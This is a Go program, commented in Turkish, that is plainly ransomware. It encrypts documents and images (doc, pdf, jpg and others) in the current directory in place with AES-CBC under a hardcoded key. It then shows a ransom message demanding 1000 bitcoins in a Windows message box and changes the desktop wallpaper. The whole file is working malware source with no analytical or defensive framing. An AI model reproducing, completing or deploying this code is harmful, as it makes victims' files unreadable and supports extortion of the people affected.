package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io"
    "io/ioutil"
    "path/filepath"
    "strings"
    "syscall"
    "unsafe"
    "bytes"
)

var (
    user32              = syscall.NewLazyDLL("user32.dll")
    systemParametersInfo = user32.NewProc("SystemParametersInfoW")
    procMessageBox      = user32.NewProc("MessageBoxW") // Burada MessageBoxW tanımlanıyor
)
const (
    EXTENSIONS = "doc,docx,txt,xls,pdf,jpg,png,jpeg"
    PASSWORD   = "1234567890123456" // Şifreleme anahtarı
)

const (
    SPI_SETDESKWALLPAPER = 0x0014
    SPIF_UPDATEINIFILE   = 0x01
    SPIF_SENDCHANGE      = 0x02
)

func main() {
    // Şifreleme anahtarımız
    key := []byte("1234567890123456")

    // Belirlediğimiz dosya uzantılarını işleyeceğiz
    extensions := strings.Split("doc,docx,txt,xls,pdf,jpg,png,jpeg", ",")
    for _, extension := range extensions {
        // Her uzantıya sahip dosyaları al
        files, _ := filepath.Glob(fmt.Sprintf("*.%s", extension))
        for _, file := range files {
            encryptFile(file, key) // Dosyaları şifrele
        }
    }

    
    message := "I am hacker, you need to pay 1000 bitcoins"
    fmt.Println(message)
    setWallpaper("C:\\Adsiz.jpg") // Masaüstü arka planını değiştir

    showMessageBox(message)
    setWallpaper("Adsiz.jpg")
    
}

func encryptFile(filename string, key []byte) {
    plaintext, err := ioutil.ReadFile(filename)
    if err != nil {
        fmt.Println(err)
        return
    }

    block, err := aes.NewCipher(key)
    if err != nil {
        fmt.Println(err)
        return
    }

    plaintext = PKCS7Padding(plaintext, aes.BlockSize)

    ciphertext := make([]byte, aes.BlockSize+len(plaintext))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        fmt.Println(err)
        return
    }

    mode := cipher.NewCBCEncrypter(block, iv)
    mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

    if err := ioutil.WriteFile(filename, ciphertext, 0644); err != nil {
        fmt.Println(err)
        return
    }
}

func PKCS7Padding(data []byte, blockSize int) []byte {
    padding := blockSize - len(data)%blockSize
    padText := bytes.Repeat([]byte{byte(padding)}, padding)
    return append(data, padText...)
}

func setWallpaper(file string) {
    // Masaüstü arka planını değiştirme işlemi
    path, _ := syscall.UTF16PtrFromString(file)
    systemParametersInfo.Call(
        uintptr(0x0014),
        0,
        uintptr(unsafe.Pointer(path)),
        uintptr(0x01|0x02),
    )
}

func showMessageBox(message string) {
    // Kullanıcıya mesajı gösterme işlemi
    caption := syscall.StringToUTF16Ptr("Fidye Yazılımı")
    text := syscall.StringToUTF16Ptr(message)
    procMessageBox.Call(0, uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(caption)), 0)
}